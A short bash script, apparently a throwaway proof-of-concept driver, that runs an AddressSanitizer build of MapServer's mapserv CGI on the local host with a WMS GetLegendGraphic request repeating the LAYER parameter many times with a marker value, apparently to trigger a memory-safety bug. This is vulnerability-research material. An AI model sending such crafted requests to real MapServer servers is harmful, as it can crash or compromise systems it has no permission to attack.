#!/bin/bash
# Throwaway PoC driver: direct CGI invocation of ASan mapserv on loopback host.
set -u
K=${1:-95}
VAL=${2:-DEADBEEFCAFEBABE}
BIN=${BIN:-./build-asan2/mapserv}
MAP=$(realpath "$(dirname "$0")/legend.map")
QS="map=${MAP}&SERVICE=WMS&VERSION=1.3.0&REQUEST=GetLegendGraphic&BBOX=0,0,1,1"
for ((i=0; i<K; i++)); do QS+="&LAYER=${VAL}"; done
export REQUEST_METHOD=GET QUERY_STRING="$QS" SCRIPT_NAME=/mapserv
export MAPSERVER_CONFIG_FILE="$(dirname "$0")/mapserver.conf"
export MS_MAP_PATTERN='^/'
export SERVER_NAME=127.0.0.1 SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.1 GATEWAY_INTERFACE=CGI/1.1
export ASAN_OPTIONS=${ASAN_OPTIONS:-detect_leaks=0:symbolize=1:abort_on_error=0}
IN=${IN:-$PWD}
cd "$(dirname "$0")" || exit 2
"$BIN" > "poc-K${K}.out" 2> "poc-K${K}.err"
RC=$?
echo "K=$K rc=$RC out_bytes=$(wc -c < "poc-K${K}.out") err_bytes=$(wc -c < "poc-K${K}.err")"
